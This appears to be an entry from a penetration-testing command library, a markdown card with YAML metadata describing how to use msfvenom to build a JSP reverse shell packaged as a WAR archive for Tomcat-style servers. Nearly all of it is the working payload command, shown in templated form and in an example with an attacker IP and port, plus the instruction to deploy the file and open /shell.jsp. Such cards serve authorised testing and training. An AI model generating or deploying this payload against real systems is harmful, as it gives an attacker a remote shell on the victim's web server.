---
id: a49d1b75-c248-4bd3-9cbd-f4c869285e9e
name: msfvenom-generate-java-jsp-shell-reverse-tcp-war
type: command
executor: bash
data: >-
  msfvenom -p java/jsp_shell_reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f war
  > $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:21.275562+00:00'
updated_at: '2023-04-10T20:25:02.586400+00:00'
platforms:
  - Java
tags:
  - war
  - reverse-shell
  - payload-generation
verified: true
validated: true
---

# msfvenom-generate-java-jsp-shell-reverse-tcp-war

## Command

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="$_LHOST" LPORT="$_LPORT" -f war > $_OUTPUT_FILE
```

## Description

Produces a WAR archive containing a JSP reverse shell for deployment in Java web containers like Tomcat.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -p java/jsp_shell_reverse_tcp | JSP shell payload | Yes |
| LHOST="$_LHOST" | IP | Yes |
| LPORT="$_LPORT" | Port | Yes |
| -f war | WAR archive format | Yes |
| > $_OUTPUT_FILE | Output (e.g., shell.war) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
```

## Expected Output

'shell.war' archive. Deploy and access /shell.jsp.

## Related

- [[procedures/Meterpreter-Payload-Generation]]
- [[tools/Metasploit-Framework]]
